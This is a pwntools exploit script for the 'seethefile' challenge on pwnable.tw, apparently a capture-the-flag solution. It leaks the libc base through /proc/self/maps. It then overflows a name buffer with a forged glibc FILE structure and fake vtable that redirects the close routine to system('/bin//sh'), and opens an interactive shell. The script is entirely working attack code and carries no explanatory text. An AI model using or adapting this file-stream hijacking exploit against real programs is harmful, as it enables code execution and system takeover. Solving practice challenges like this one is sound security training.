from pwn import *


elf = ELF('./seethefile')

BEDUG = False

if BEDUG==True:
    io = process('./seethefile')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    io = remote('chall.pwnable.tw', 10200)
    libc = ELF('./libc_32.so.6')

def openfile(path):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'1')
    print(io.recvuntil(b'What do you want to see :'))
    io.sendline(path)

def readfile():
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'2')

def writefile():
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'3')

def closefile():
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'4')

def quit(payload):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'5')
    print(io.recvuntil(b'Leave your name :'))
    io.sendline(payload)

#payload = b'A'*32+p32(elf.sym['name'])+b'B'*4+b'C'*4+b'D'*4

openfile(b'/proc/self/maps')
if BEDUG==True:
    readfile()
    readfile()
    writefile()
    print(io.recvuntil(b'[heap]\n'))
    libc.address = int(io.recv(8), 16) + 0x1000
else:
    readfile()
    writefile()
    print(io.recvuntil(b'[heap]\n'))
    libc.address = int(io.recv(8), 16) + 0x1000

fake_stream = elf.sym['name']+48

pl = b'\0'*32
pl += p32(fake_stream)
### FAKE STREAM ###
vtable = fake_stream + 0xa0
pl += b'A'*12
#pl += p32(0xfbad2488) + p32(0) * 3
pl += b'/bin//sh' + p32(0) * 2
pl += p32(0) * 4
pl += p32(0) * 4
pl += p32(0) + p32(libc.sym['_IO_2_1_stderr_']) + p32(3) + p32(0)
pl += p32(0) * 2 + p32(elf.sym['name']) + p32(0)
pl += p32(0) * 4
pl += p32(0) * 4
pl += p32(0) * 4
pl += p32(0) * 4
pl += p32(0) + p32(vtable) + p32(0) + p32(0)

### FAKE  VTABLE ###

pl += p32(0)
pl += p32(0)
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['_IO_new_file_finish'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['_IO_new_file_overflow'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['_IO_new_file_underflow'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['__GI__IO_default_uflow'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['__GI__IO_default_pbackfail'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['_IO_new_file_xsputn'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['__GI__IO_file_xsgetn'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['_IO_new_file_seekoff'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['_IO_default_seekpos'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['_IO_new_file_setbuf'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['_IO_new_file_sync'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['__GI__IO_file_doallocate'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['__GI__IO_file_read'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['_IO_new_file_write'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['__GI__IO_file_seek'])
pl += p32(libc.sym['system']) # p32(libc.sym['__GI__IO_file_close'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['__GI__IO_file_stat'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['_IO_default_showmanyc'])
pl += p32(libc.sym['_IO_list_all']) # p32(libc.sym['_IO_default_imbue'])
pl += p32(libc.sym['_IO_list_all']) # p32(0) * 3

####################
pause()
quit(pl)
io.interactive()
